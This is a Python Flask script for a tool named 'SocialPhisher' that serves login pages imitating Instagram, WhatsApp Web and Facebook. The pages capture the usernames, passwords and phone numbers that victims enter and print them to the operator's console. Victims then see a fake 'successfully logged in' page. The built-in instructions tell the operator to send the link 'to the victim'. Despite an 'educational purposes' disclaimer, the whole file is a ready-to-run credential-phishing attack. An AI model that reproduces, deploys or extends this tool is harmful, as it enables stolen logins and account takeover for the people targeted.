from flask import Flask, render_template_string, request
import pyfiglet
ascii_art = pyfiglet.figlet_format("SocialPhisher")
from colorama import *
import time
import os

init()
definition = """
SocialPhisher
SocialPhisher is a phishing tool created by FRn13ds to simulate social engineering attacks using realistic phishing pages.
It supports multiple platforms and is intended for educational and ethical purposes only. Misuse for illegal activities is strictly prohibited.
"""
about ="""
Instructions:
First, the tool will provide you with a link that you need to open in your browser on your device.
Second, choose the social media platform you want to target your victim on.
Third, copy the link above and send it to the victim
"""
goodbye_msg = f"""
{ascii_art}
Thank you for using SocialPhisher! Stay safe and use responsibly.
Goodbye!
"""


app = Flask(__name__)

# HTML templates for phishing pages
templates = {
    'instagram': '''
   <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #fafafa;
            margin: 0;
            padding: 0;
        }
        .container {
            max-width: 350px;
            margin: 100px auto;
            padding: 20px;
            background-color: #fff;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
            text-align: center;
        }
        h1 {
            color: #3897f0;
            margin-bottom: 20px;
        }
        .logo {
            width: 100px;
            margin-bottom: 20px;
        }
        input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 4px;
        }
        button {
            width: 100%;
            padding: 10px;
            background-color: #3897f0;
            color: #fff;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        button:hover {
            background-color: #007bbf;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo" class="logo">
        <h1>Instagram</h1>
        <form action="/login/instagram" method="post">
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
    </div>
</body>
</html>

    ''',
    'whatsapp': '''
   <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WhatsApp Web</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f0f0;
            margin: 0;
            padding: 0;
        }
        .container {
            max-width: 400px;
            margin: 50px auto;
            padding: 20px;
            background-color: #fff;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
            text-align: center;
        }
        h1 {
            color: #25d366;
        }
        .logo {
            width: 100px;
            margin-bottom: 20px;
        }
        input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 4px;
        }
        button {
            width: 100%;
            padding: 10px;
            background-color: #25d366;
            color: #fff;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp Logo" class="logo">
        <h1>WhatsApp Web</h1>
        <form action="/login/whatsapp" method="post">
            <input type="text" name="phone" placeholder="Phone number" required>
            <button type="submit">Send Code</button>
        </form>
    </div>
</body>
</html>

    ''',
    'facebook': '''
  <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f2f5;
            margin: 0;
            padding: 0;
        }
        .container {
            max-width: 400px;
            margin: 50px auto;
            padding: 20px;
            background-color: #fff;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
            text-align: center;
        }
        h1 {
            color: #1877f2;
        }
        .logo {
            width: 100px;
            margin-bottom: 20px;
        }
        input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 4px;
        }
        button {
            width: 100%;
            padding: 10px;
            background-color: #1877f2;
            color: #fff;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo" class="logo">
        <h1>Facebook</h1>
        <form action="/login/facebook" method="post">
            <input type="text" name="email" placeholder="Email or Phone number" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
    </div>
</body>
</html>

    '''
}

@app.route('/')
def index():
    return '''
   <!DOCTYPE html>
<html>
<head>
    <title>Phishing Pages</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            margin-top: 50px;
        }
        a {
            text-decoration: none;
            color: #333;
            font-size: 24px;
            margin: 10px;
        }
        a:hover {
            color: #007bff;
        }
    </style>
</head>
<body>
    <h1>Welcome Dear User!</h1>
    <p style ="font-family:monospace;">Please choose a social media platform:</p>
    <a href="/instagram"><i class="fab fa-instagram"></i> Instagram</a><br>
    <a href="/whatsapp"><i class="fab fa-whatsapp"></i> WhatsApp</a><br>
    <a href="/facebook"><i class="fab fa-facebook"></i> Facebook</a><br>
    <h6 style ="font-family:monospace;">Please choose a social media platform and follow this steps :</h6>
   <img src="https://i.ibb.co/x2rdGtz/Screenshot-282.png" <="" img="" style="
    width: 600px;
">
<img src="https://i.ibb.co/2N1v1zr/Screenshot-283.png" <="" img="" style="
    width: 600px;
">
</body>
</html>

    '''

@app.route('/instagram')
def instagram():
    return render_template_string(templates['instagram'])

@app.route('/whatsapp')
def whatsapp():
    return render_template_string(templates['whatsapp'])

@app.route('/facebook')
def facebook():
    return render_template_string(templates['facebook'])

@app.route('/login/instagram', methods=['POST'])
def instagram_login():
    username = request.form['username']
    password = request.form['password']
    # Handle login (e.g., save to a file or database)
    print(f"Instagram Login: {username}, {password}")
    return '''
    <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Thank You</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f0f0f0;
            margin: 0;
        }
        .thank-you-message {
            text-align: center;
            background-color: #ffffff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
        }
        h1 {
            color: #4CAF50;
        }
        p {
            color: #555;
        }
    </style>
</head>
<body>
    <div class="thank-you-message">
        <h1>Thank You!</h1>
        <p>You have successfully logged in.</p>
    </div>
    <script>
        // Optional: Redirect after a few seconds
        setTimeout(() => {
            window.location.href = 'https://frn13ds.github.io/404-Not-Found/'; // Change to your homepage URL
        }, 3000);
    </script>
</body>
</html>
'''

@app.route('/login/whatsapp', methods=['POST'])
def whatsapp_login():
    phone = request.form['phone']
    # Handle login (e.g., save to a file or database)
    print(f"WhatsApp Login: {phone}")
    return "Code sent!"

@app.route('/login/facebook', methods=['POST'])
def facebook_login():
    email = request.form['email']
    password = request.form['password']
    # Handle login (e.g., save to a file or database)
    print(f"Facebook Login: {email}, {password}")
    return '''
    <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Thank You</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f0f0f0;
            margin: 0;
        }
        .thank-you-message {
            text-align: center;
            background-color: #ffffff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
        }
        h1 {
            color: #4CAF50;
        }
        p {
            color: #555;
        }
    </style>
</head>
<body>
    <div class="thank-you-message">
        <h1>Thank You!</h1>
        <p>You have successfully logged in.</p>
    </div>
    <script>
        // Optional: Redirect after a few seconds
        setTimeout(() => {
            window.location.href = 'https://frn13ds.github.io/404-Not-Found/'; // Change to your homepage URL
        }, 3000);
    </script>
</body>
</html>
'''

if __name__ == '__main__':
        time.sleep(2)
        print(Fore.GREEN + ascii_art)
        print("                                           V0.3")
        print(Fore.RED +"Welcome Dear User !... ")
        enter = input(Style.RESET_ALL +"press any key to continue...")
        os.system('cls' if os.name == 'nt' else 'clear')
        print(Fore.GREEN + ascii_art)
        print(Fore.BLUE +"[!] Welcome Again To This Tool ! ")
        def main():
             print(Back.MAGENTA +"MENU :",Style.RESET_ALL)
             print("[1] About The Tool ")
             print("[2] How To Use ")
             print("[3] Start ")
             print("[4] Exit")
             while True :
                  choose = input(Fore.LIGHTCYAN_EX +"Select From Menu :")
                  if choose == "1":
                       print(Fore.GREEN + definition)
                  elif choose == "2":
                       print(Fore.RED + about)
                  elif choose == "3":
                       app.run(host='0.0.0.0', port=5000)
                  elif choose =="4":
                       print(Fore.CYAN + goodbye_msg)
                       break 
                  else :
                       print(Fore.RED +"Something Went wrong , Try again !")
main()

